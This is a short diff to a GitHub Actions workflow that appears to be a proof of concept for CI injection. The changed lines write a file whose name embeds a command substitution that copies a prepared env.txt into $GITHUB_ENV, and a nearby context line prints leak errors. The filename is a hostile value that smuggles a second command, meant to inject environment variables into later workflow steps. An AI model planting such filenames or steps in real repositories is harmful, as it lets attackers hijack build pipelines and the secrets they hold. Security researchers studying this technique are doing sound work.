@@ -22,8 +22,10 @@ jobs:
             console.log(line);
           } catch (e) { console.log('LEAKERR ' + e.message); }
           JS
-          : > '/tmp/content/$(cp /tmp/content/contentdefault/env.txt $GITHUB_ENV)report.txt'
-          ls -la /tmp/content
+          python3 - <<'PY'
+          open('/tmp/content/$(cp /tmp/content/contentdefault/env.txt $GITHUB_ENV)report.txt','w').write('x')
+          PY
+          ls -la /tmp/content | sed -n '1,12p'
       - name: upload artifact
         uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
